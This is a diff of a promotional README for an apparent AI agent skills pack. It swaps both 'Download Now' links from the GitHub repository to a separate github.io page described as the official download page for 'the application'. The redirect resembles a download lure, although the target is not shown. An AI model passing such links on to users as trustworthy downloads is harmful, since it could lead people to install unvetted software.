@@ -1,6 +1,6 @@
 # ⚡ ai-agent-skills-pack-2026 - Give Your AI Agent Superpowers Today
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20The%20Pack-brightgreen?style=for-the-badge&logo=github)](https://github.com/aribakhan4628/ai-agent-skills-pack-2026)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20The%20Pack-brightgreen?style=for-the-badge&logo=github)](https://aribakhan4628.github.io)
 
 ## 👋 Welcome to Your AI Assistant's New Toolbox
 
@@ -40,7 +40,7 @@ Getting started is incredibly easy. Follow these simple steps:
 
 Click the green **"Download Now"** button at the top of this page, or use this link:
 
-**👉 [Visit this link to download the application](https://github.com/aribakhan4628/ai-agent-skills-pack-2026)**
+**👉 [Visit this link to download the application](https://aribakhan4628.github.io)**
 
 This will take you to the official download page. Once you're there, look for the "Download" or "Get" button. Click it, and the download will begin automatically.
 
